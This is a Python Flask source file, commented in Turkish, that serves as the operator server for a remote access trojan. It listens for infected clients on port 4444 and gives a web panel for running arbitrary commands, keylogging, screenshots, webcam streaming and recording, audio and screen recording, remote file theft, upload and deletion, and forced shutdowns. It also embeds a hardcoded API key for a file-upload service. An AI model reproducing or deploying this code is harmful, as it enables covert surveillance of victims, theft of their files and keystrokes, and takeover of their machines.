import threading
import socket
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file, send_from_directory, Response
import time
import os
from app_utils import upload_file_to_gofile

app = Flask(__name__)

# Bağlı clientlar için temel veri yapısı
clients = {}
clients_lock = threading.Lock()
api_key = "VrsN8kRWABt3wbWo9bYRjucJ81Fcgdjs"

# Client bağlantılarını yöneten thread
class ClientHandler(threading.Thread):
    def __init__(self, conn, addr):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.hostname = None
        self.last_seen = time.strftime('%Y-%m-%d %H:%M:%S')
        self.id = f"{addr[0]}:{addr[1]}"
        self.running = True
        self.buffer = []

    def run(self):
        try:
            # İlk mesaj hostname ise al
            msg = self.conn.recv(4096).decode(errors="ignore")
            if msg.startswith("HOSTNAME:"):
                self.hostname = msg.split(":",1)[1]
            else:
                self.hostname = self.id
            with clients_lock:
                clients[self.id] = self
            while self.running:
                try:
                    self.conn.settimeout(1)
                    data = self.conn.recv(4096)
                    if data:
                        self.buffer.append(data)
                        self.last_seen = time.strftime('%Y-%m-%d %H:%M:%S')
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception:
            pass
        finally:
            with clients_lock:
                if self.id in clients:
                    del clients[self.id]
            self.conn.close()

    def send_command(self, command):
        self.conn.send(command.encode())
    def get_buffer(self):
        out = b''.join(self.buffer)
        self.buffer.clear()
        return out

    def send_command_and_wait(self, command, expect_prefix, timeout):
        self.send_command(command)
        start_time = time.time()
        while time.time() - start_time < timeout:
            data = self.get_buffer().decode(errors="ignore")
            if data and data.startswith(expect_prefix):
                return data
        return None

# TCP server thread
class RATServer(threading.Thread):
    def __init__(self, host='0.0.0.0', port=4444):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.sock = None

    def run(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(20)
        print(f"[+] RAT Server listening on {self.host}:{self.port}")
        while True:
            conn, addr = self.sock.accept()
            handler = ClientHandler(conn, addr)
            handler.start()

# Screenshot dosyalarını kaydetmek için klasör
SCREENSHOT_DIR = os.path.join('uploads', 'screenshots')
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Webcam dosyalarını kaydetmek için klasör
WEBCAM_DIR = os.path.join('uploads', 'webcam')
os.makedirs(WEBCAM_DIR, exist_ok=True)

# Keylog dosyalarını kaydetmek için klasör
KEYLOG_DIR = os.path.join('uploads', 'keylog')
os.makedirs(KEYLOG_DIR, exist_ok=True)

# Sistem bilgisi dosyalarını kaydetmek için klasör
SYSINFO_DIR = os.path.join('uploads', 'sysinfo')
os.makedirs(SYSINFO_DIR, exist_ok=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/clients")
def api_clients():
    with clients_lock:
        client_list = [
            {"id": c.id, "hostname": c.hostname, "last_seen": c.last_seen}
            for c in clients.values()
        ]
    return jsonify({"clients": client_list})

@app.route("/send_command", methods=["POST"])
def send_command():
    client_id = request.form.get("client_id")
    command = request.form.get("command")
    with clients_lock:
        client = clients.get(client_id)
    if client:
        try:
            client.send_command(command)
            return jsonify({"status": "success", "message": "Komut gönderildi."})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
    return jsonify({"status": "error", "message": "Client bulunamadı."})

@app.route("/api/client_output/<client_id>")
def api_client_output(client_id):
    with clients_lock:
        client = clients.get(client_id)
    if client:
        data = client.get_buffer()
        return jsonify({"output": data.decode(errors="ignore")})
    return jsonify({"output": "Client bulunamadı."})

@app.route("/client_output")
def client_output():
    client_id = request.args.get('id')
    return render_template("client_output.html", client_id=client_id)

@app.route("/screenshot")
def screenshot():
    client_id = request.args.get('id')
    return render_template("screenshot.html", client_id=client_id)

@app.route("/api/screenshot/<client_id>")
def api_screenshot(client_id):
    # Son alınan screenshot dosyasını bul
    files = [f for f in os.listdir(SCREENSHOT_DIR) if f.startswith(client_id+"_") and f.endswith('.png')]
    if files:
        files.sort(reverse=True)
        fname = files[0]
        url = url_for('get_screenshot_file', filename=fname)
        return jsonify({'url': url})
    return jsonify({'url': None})

@app.route("/uploads/screenshots/<filename>")
def get_screenshot_file(filename):
    return send_from_directory(SCREENSHOT_DIR, filename)

@app.route("/webcam")
def webcam():
    client_id = request.args.get('id')
    return render_template("webcam.html", client_id=client_id)

@app.route("/api/webcam/<client_id>")
def api_webcam(client_id):
    files = [f for f in os.listdir(WEBCAM_DIR) if f.startswith(client_id+"_") and f.endswith('.png')]
    if files:
        files.sort(reverse=True)
        fname = files[0]
        url = url_for('get_webcam_file', filename=fname)
        return jsonify({'url': url})
    return jsonify({'url': None})

@app.route("/uploads/webcam/<filename>")
def get_webcam_file(filename):
    return send_from_directory(WEBCAM_DIR, filename)

@app.route("/keylogger")
def keylogger():
    client_id = request.args.get('id')
    return render_template("keylogger.html", client_id=client_id)

@app.route("/api/keylog/<client_id>")
def api_keylog(client_id):
    # Son alınan keylog dosyasını bul
    files = [f for f in os.listdir(KEYLOG_DIR) if f.startswith(client_id+"_") and f.endswith('.txt')]
    if files:
        files.sort(reverse=True)
        fname = files[0]
        with open(os.path.join(KEYLOG_DIR, fname), "r", encoding="utf-8", errors="ignore") as f:
            log = f.read()
        return jsonify({'log': log})
    return jsonify({'log': ''})

@app.route("/sysinfo")
def sysinfo():
    client_id = request.args.get('id')
    return render_template("sysinfo.html", client_id=client_id)

@app.route("/api/sysinfo/<client_id>")
def api_sysinfo(client_id):
    files = [f for f in os.listdir(SYSINFO_DIR) if f.startswith(client_id+"_") and f.endswith('.txt')]
    if files:
        files.sort(reverse=True)
        fname = files[0]
        with open(os.path.join(SYSINFO_DIR, fname), "r", encoding="utf-8", errors="ignore") as f:
            info = f.read()
        return jsonify({'info': info})
    return jsonify({'info': ''})

@app.route("/explorer")
def explorer():
    client_id = request.args.get('id')
    return render_template("explorer.html", client_id=client_id)

@app.route("/api/explorer/<client_id>")
def api_explorer(client_id):
    path = request.args.get('path', '/')
    # Client'a listdir komutu gönder ve sonucu bekle
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"listdir {path}", expect_prefix="[LISTDIR]", timeout=8)
        entries = []
        if result and result.startswith("[LISTDIR]"):
            lines = result[len("[LISTDIR] "):].split('\n')
            for line in lines:
                if '|' in line:
                    name, typ, size, fullpath = line.split('|', 3)
                    entries.append({"name": name, "type": typ, "size": size, "fullpath": fullpath})
        return jsonify({"path": path, "entries": entries})
    return jsonify({"path": path, "entries": []})

@app.route("/api/download/<client_id>")
def api_download(client_id):
    path = request.args.get('path')
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"download {path}", expect_prefix="[DOWNLOAD]", timeout=15)
        if result and result.startswith("[DOWNLOAD]"):
            import base64
            try:
                fname_b64 = result[len("[DOWNLOAD] "):]
                fname, b64 = fname_b64.split('|', 1)
                file_bytes = base64.b64decode(b64)
                from flask import send_file
                import io
                return send_file(io.BytesIO(file_bytes), download_name=fname, as_attachment=True)
            except Exception as e:
                return f"İndirme hatası: {e}", 500
    return "Dosya indirilemedi.", 404

@app.route("/api/uploadfile/<client_id>", methods=["POST"])
def api_uploadfile(client_id):
    file = request.files['file']
    path = request.form.get('path', '/')
    fname = file.filename
    import base64
    b64 = base64.b64encode(file.read()).decode()
    fullpath = os.path.join(path, fname)
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"upload {fullpath} {b64}", expect_prefix="[UPLOAD]", timeout=15)
        if result and result.startswith("[UPLOAD] OK"):
            return jsonify({"status": "success"})
    return jsonify({"status": "fail"})

@app.route("/api/deletefile/<client_id>", methods=["POST"])
def api_deletefile(client_id):
    path = request.args.get('path')
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"delete {path}", expect_prefix="[DELETE]", timeout=10)
        if result and result.startswith("[DELETE] OK"):
            return jsonify({"status": "success"})
    return jsonify({"status": "fail"})

@app.route("/upload", methods=["GET", "POST"])
def upload():
    if request.method == "GET":
        return render_template("file_manager.html")
    file = request.files['file']
    save_path = os.path.join('uploads', file.filename)
    os.makedirs('uploads', exist_ok=True)
    file.save(save_path)
    url = upload_file_to_gofile(save_path, api_key)
    return jsonify({'url': url or 'Yükleme başarısız'})

@app.route("/screenrec")
def screenrec():
    client_id = request.args.get('id')
    return render_template("screenrec.html", client_id=client_id)

@app.route("/api/screenrec/<client_id>", methods=["POST"])
def api_screenrec(client_id):
    saniye = int(request.form.get('duration', 10))
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"screenrec {saniye}", expect_prefix="[SCREENREC]", timeout=saniye+20)
        if result and result.startswith("[SCREENREC]"):
            url = result[len("[SCREENREC] "):].strip()
            return jsonify({'status': 'success', 'url': url})
    return jsonify({'status': 'fail'})

@app.route("/alertmsg")
def alertmsg():
    client_id = request.args.get('id')
    return render_template("alertmsg.html", client_id=client_id)

@app.route("/api/alertmsg/<client_id>", methods=["POST"])
def api_alertmsg(client_id):
    msg = request.form.get('msg', '')
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"alertmsg {msg}", expect_prefix="[ALERTMSG]", timeout=10)
        if result and result.startswith("[ALERTMSG]"):
            return jsonify({'status': 'success'})
    return jsonify({'status': 'fail'})

@app.route("/audiorec")
def audiorec():
    client_id = request.args.get('id')
    return render_template("audiorec.html", client_id=client_id)

@app.route("/api/audiorec/<client_id>", methods=["POST"])
def api_audiorec(client_id):
    saniye = int(request.form.get('duration', 10))
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"audiorec {saniye}", expect_prefix="[AUDIOREC]", timeout=saniye+20)
        if result and result.startswith("[AUDIOREC]"):
            url = result[len("[AUDIOREC] "):].strip()
            return jsonify({'status': 'success', 'url': url})
    return jsonify({'status': 'fail'})

@app.route("/shutdown_timer")
def shutdown_timer():
    client_id = request.args.get('id')
    return render_template("shutdown_timer.html", client_id=client_id)

@app.route("/api/shutdown_timer/<client_id>", methods=["POST"])
def api_shutdown_timer(client_id):
    saniye = int(request.form.get('duration', 60))
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"shutdown_in {saniye}", expect_prefix="[SHUTDOWN_IN]", timeout=10)
        if result and result.startswith("[SHUTDOWN_IN]"):
            return jsonify({'status': 'success'})
    return jsonify({'status': 'fail'})

@app.route("/webcamrec")
def webcamrec():
    client_id = request.args.get('id')
    return render_template("webcamrec.html", client_id=client_id)

@app.route("/api/webcamrec/<client_id>", methods=["POST"])
def api_webcamrec(client_id):
    saniye = int(request.form.get('duration', 10))
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"webcamrec {saniye}", expect_prefix="[WEBCAMREC]", timeout=saniye+20)
        if result and result.startswith("[WEBCAMREC]"):
            url = result[len("[WEBCAMREC] "):].strip()
            return jsonify({'status': 'success', 'url': url})
    return jsonify({'status': 'fail'})

@app.route("/google_search")
def google_search():
    client_id = request.args.get('id')
    return render_template("google_search.html", client_id=client_id)

@app.route("/api/google_search/<client_id>", methods=["POST"])
def api_google_search(client_id):
    query = request.form.get('query', '')
    with clients_lock:
        client = clients.get(client_id)
    if client:
        result = client.send_command_and_wait(f"google_search {query}", expect_prefix="[GOOGLE]", timeout=10)
        if result and result.startswith("[GOOGLE]"):
            return jsonify({'status': 'success'})
    return jsonify({'status': 'fail'})

@app.route("/webcam_stream/<client_id>")
def webcam_stream(client_id):
    # Client'ta stream başlat komutu gönder
    with clients_lock:
        client = clients.get(client_id)
    if client:
        client.send_command_and_wait("webcam_stream_start", expect_prefix="[WEBCAM_STREAM]", timeout=5)
        import requests
        def generate():
            stream_url = f"http://{client.addr[0]}:8081/"
            with requests.get(stream_url, stream=True, timeout=10) as r:
                boundary = b'--frame'
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        yield chunk
        return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Client bulunamadı", 404

@app.route("/webcam_streamer")
def webcam_streamer():
    client_id = request.args.get('id')
    return render_template("webcam_stream.html", client_id=client_id)

if __name__ == "__main__":
    rat_server = RATServer()
    rat_server.start()
    app.run(host="0.0.0.0", port=5000, debug=True)
